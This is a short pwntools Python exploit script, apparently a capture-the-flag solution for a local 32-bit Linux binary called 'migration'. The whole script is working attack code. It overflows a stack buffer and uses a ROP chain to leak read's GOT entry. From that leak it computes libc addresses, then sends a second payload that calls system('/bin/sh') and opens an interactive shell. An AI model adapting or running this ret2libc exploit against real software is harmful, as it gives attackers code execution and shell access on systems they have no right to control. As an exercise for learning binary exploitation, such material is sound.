from pwn import*

context(arch = 'i386', os ='linux')
context.log_level = 'debug'

elf = ELF('./migration')
libc = elf.libc

r = process('./migration')
r.recvuntil('best :\n')

puts_plt = elf.plt['puts']
main_addr = 0x080484f2
pr = 0x0804836d
read_got = elf.got['read']
bss = elf.bss() + 0x500

payload = ''
payload += 'A'*40
payload += p32(bss)                  # ret 
payload += p32(puts_plt)
payload += p32(pr)                      
payload += p32(read_got)
payload += p32(main_addr)           #main + 71

r.send(payload)

read_addr = u32(r.recv(4))
r.recvuntil('\n')

libc_base = read_addr - libc.symbols['__read']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + list(libc.search('/bin/sh\x00'))[0]

log.info('read_addr = '+hex(read_addr))
log.info('libc_base = '+hex(libc_base))
log.info('system_addr = '+hex(system_addr))
log.info('/bin/sh_addr = '+hex(binsh_addr))

payload2 = ''
payload2 = 'B'*44
payload2 += p32(system_addr)
payload2 += 'CCCC'
payload2 += p32(binsh_addr)

r.send(payload2)
r.interactive()
